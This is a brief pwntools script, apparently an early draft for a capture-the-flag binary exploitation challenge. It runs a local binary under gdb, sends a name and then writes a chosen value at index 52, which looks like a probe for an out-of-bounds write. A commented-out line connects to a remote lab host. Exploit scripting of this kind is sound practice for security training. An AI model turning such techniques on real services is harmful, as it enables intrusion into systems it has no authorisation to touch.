from pwn import *

context.log_level = "debug"
bin = ELF("pwn")
p = bin.process()
#p = remote("bdd3dd2bf77c76d516f9e715c96cb1fa.kr-lab.com",57856)


p.sendlineafter("name:","zoniony")
gdb.attach(p)
p.sendlineafter("index\n",str(52))
p.sendlineafter("value\n",str(0x23333))
pause()